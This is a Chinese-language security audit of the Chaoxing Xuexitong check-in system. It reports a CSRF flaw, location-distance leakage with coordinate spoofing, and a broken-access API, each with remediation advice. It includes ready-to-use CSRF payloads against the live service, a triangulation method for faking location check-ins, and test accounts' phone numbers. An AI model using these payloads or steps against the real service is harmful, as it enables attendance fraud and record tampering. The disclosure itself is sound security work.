# 超星学习通签到系统安全审计报告

**审计日期**: 2026-06-03
**版本**: v5.0（最终版）
**审计范围**: 学习通App端签到功能安全评估
**测试账号**: 教师 19712720708 (puid=402644510)，学生 18436633997 (puid=431407443)
**测试课程**: courseId=257485372, classId=132821141

---

## 核心结论

经过系统性安全评估，发现以下安全漏洞：

| # | 漏洞 | 严重程度 | 学生端可直接利用 |
|---|---|---|---|
| 1 | `/pptSign/updateSignStatusByUidsV2` CSRF漏洞 | **HIGH (7.5)** | 否（需诱导教师） |
| 2 | 位置签到距离信息泄露 + 位置伪造 | **MEDIUM (5.3)** | **是** |
| 3 | `/newsign/updateSignStatus` 假success + 越权 | **LOW (3.5)** | 是（但无实际影响） |

**重要更正**: 之前报告将`/newsign/updateSignStatus`评为CRITICAL级别，经验证该API返回"success"但**实际不修改任何数据**（假success），降级为LOW。

---

## 漏洞1：CSRF - `/pptSign/updateSignStatusByUidsV2` (HIGH)

### 漏洞描述

教师端签到状态修改API `/pptSign/updateSignStatusByUidsV2` 存在完全无防护的CSRF漏洞。攻击者可构造恶意页面，当已登录的教师访问时，自动修改任意学生的签到状态。

### 验证证据

```
测试项                              | 响应                    | 结果
----------------------------------- | ----------------------- | ----
教师POST(标准Header)                | {"state":"success"}     | 修改成功
教师POST(无X-Requested-With)        | {"state":"success"}     | 修改成功
教师POST(无任何自定义Header)         | {"state":"success"}     | 修改成功
教师POST(Referer=evil.com)          | {"state":"success"}     | 修改成功
教师GET方式                          | {"state":"success"}     | 修改成功
```

**关键问题**:
- 无CSRF Token
- 支持GET方法（最简单的CSRF，只需`<img>`标签）
- 不检查Referer/Origin
- 可实际修改签到状态数据

### CSRF PoC

**GET方式（最简单）**:
```html
<img src="https://mobilelearn.chaoxing.com/pptSign/updateSignStatusByUidsV2?DB_STRATEGY=PRIMARY_KEY&STRATEGY_PARA=activeId&activeId={aid}&uids={uid}&status=1&remark=" width="0" height="0" />
```

**POST方式（自动提交表单）**:
```html
<form id="csrf" method="POST" action="https://mobilelearn.chaoxing.com/pptSign/updateSignStatusByUidsV2?DB_STRATEGY=PRIMARY_KEY&STRATEGY_PARA=activeId&activeId={aid}">
    <input type="hidden" name="uids" value="{uid}" />
    <input type="hidden" name="status" value="1" />
    <input type="hidden" name="remark" value="" />
</form>
<script>document.getElementById('csrf').submit();</script>
```

### 攻击场景

1. 攻击者获取activeId（学生可通过活动列表API获取）和学生uid
2. 构造包含CSRF攻击的恶意网页
3. 诱导教师访问该网页（如通过邮件、消息等）
4. 教师浏览器自动发送请求，签到状态被修改

### 修复建议

1. **禁止GET方法修改数据** — API应仅接受POST
2. **添加CSRF Token验证**
3. **校验Referer/Origin头**
4. **添加SameSite Cookie属性**

---

## 漏洞2：位置签到信息泄露 + 位置伪造 (MEDIUM)

### 漏洞描述

位置签到功能存在两个关联漏洞：
1. **信息泄露**: 服务端返回学生提交位置到教师指定位置的**精确距离**（单位：米）
2. **位置伪造**: `stuSignajax` API接受任意经纬度参数，服务端仅校验距离，不验证位置来源

### 验证证据

**信息泄露** — 服务端返回精确距离:
```
提交坐标(39.908823, 116.397470) → "距教师指定签到地点618487.0米，不在可签到范围内"
提交坐标(34.75661, 113.65004)  → "距教师指定签到地点3223.0米，不在可签到范围内"
提交坐标(34.776610, 113.650040) → "距教师指定签到地点1245.0米，不在可签到范围内"
```

**三角定位反推教师位置**:
```
探测点P1(34.78, 113.66): 距离=878m
探测点P2(34.78, 113.68): 距离=1917m
探测点P3(34.80, 113.66): 距离=1721m
探测点P4(34.80, 113.68): 距离=2527m
探测点P5(34.79, 113.67): 距离=1119m

三角定位计算结果: (34.784500, 113.659700), 误差仅3m
```

**位置伪造** — stuSignajax接受任意坐标:
```
POST /pptSign/stuSignajax
  activeId={aid}&uid={uid}&latitude={任意纬度}&longitude={任意经度}&appType=15&fid=0
→ 服务端仅计算距离，不验证位置来源
```

### 攻击流程

```
1. 学生获取位置签到活动的activeId
2. 提交3-5个不同坐标，记录服务端返回的距离
3. 使用三角定位法计算教师指定位置（精度<5m）
4. 提交计算出的坐标完成位置签到
```

### 修复建议

1. **不返回精确距离** — 改为返回"在/不在签到范围内"，不泄露距离数值
2. **增加位置验证** — 检测异常的GPS精度、位置跳跃等
3. **添加设备指纹** — 检测模拟位置的应用

---

## 漏洞3：`/newsign/updateSignStatus` 假success + 越权 (LOW)

### 漏洞描述

`/newsign/updateSignStatus` API存在两个问题：
1. **假success**: API返回"success"但实际不修改任何数据
2. **越权访问**: 学生可调用教师级API，应返回权限错误

### 验证证据

**假success验证**:
```
活动 aid=5000163776153:
  修改前: status=1, updatetime=1780421850000
  学生调用 /newsign/updateSignStatus(status=2)
  API返回: "success"
  修改后: status=1, updatetime=1780421850000  ← 完全没变

对比 - 教师V2 API:
  修改前: status=1, updatetime=1780421850000
  教师调用 /pptSign/updateSignStatusByUidsV2(status=2)
  API返回: {"state":"success"}
  修改后: status=2, updatetime=1780468339000  ← 真正修改
```

**越权访问**:
```
学生POST /newsign/updateSignStatus → "success"（应返回"无权限"）
学生POST /pptSign/updateSignStatus → "无权限"（正确行为）
```

**不同参数组合均返回"success"**:
```
无DB_STRATEGY          → "success"
DB_STRATEGY=COURSEID   → "success"
DB_STRATEGY=ACTIVEID   → "success"
STRATEGY_PARA=courseId → "success"
uids=教师puid          → "success"
不存在的activeId       → 500（说明API确实做了某些验证）
```

### 根因分析

`/newsign/`路径是签到系统的新版本，在API迁移过程中：
1. 遗漏了权限校验逻辑（学生应返回"无权限"）
2. API内部逻辑可能未实现完整（返回success但未执行数据库操作）

### 修复建议

1. **添加权限校验** — 参照`/pptSign/updateSignStatus`
2. **修复API逻辑** — 确保返回值与实际操作一致
3. **审计/newsign/路径下所有API**

---

## 其他发现

### 发现A: 各签到类型的学生端防护情况

| 签到类型 | stuSignajax响应 | 防护措施 |
|---|---|---|
| 二维码签到 | "签到失败，请重新扫描" | 需要有效二维码enc参数 |
| 普通签到(已结束) | "签到已结束" | 活动结束不可签到 |
| 位置签到 | "距教师指定签到地点X米，不在可签到范围内" | 距离校验（但泄露距离） |
| 手势签到 | "签到失败[90002]" | 需要手势验证 |
| 签到码签到 | 未测试 | 需要签到码 |

### 发现B: 教师V2 API数据修改验证

| 操作 | V2 signIn查询结果 | 数据是否变化 |
|---|---|---|
| 教师设status=0(缺勤) | data=None | 签到记录被删除 |
| 教师设status=1(出勤) | status=1, createtime=当前时间 | 签到记录被创建 |
| 教师设status=2(迟到) | status=2, updatetime=当前时间 | 签到状态被修改 |

### 发现C: V2 signIn API信息泄露

`GET /v2/apis/sign/signIn?activeId={aid}&uid={uid}` 返回签到记录详情，包含精确位置（经纬度）、签到时间、签到地址等。

---

## 风险评估总结

| 漏洞 | CVSS | 攻击难度 | 实际影响 |
|---|---|---|---|
| CSRF(updateSignStatusByUidsV2) | 7.5 | 中（需诱导教师） | 可修改任意学生签到状态 |
| 位置签到信息泄露+伪造 | 5.3 | 低（学生可直接利用） | 可伪造位置完成签到 |
| 假success+越权(newsign) | 3.5 | 极低（但无实际影响） | 误导性响应，无数据修改 |

---

## 修复优先级

1. **[紧急]** `/pptSign/updateSignStatusByUidsV2` — 禁止GET方法，添加CSRF Token，校验Referer
2. **[高]** 位置签到 — 不返回精确距离，改为返回"在/不在范围内"
3. **[中]** `/newsign/updateSignStatus` — 添加权限校验，修复假success
4. **[低]** V2 signIn API — 添加访问控制，位置信息脱敏
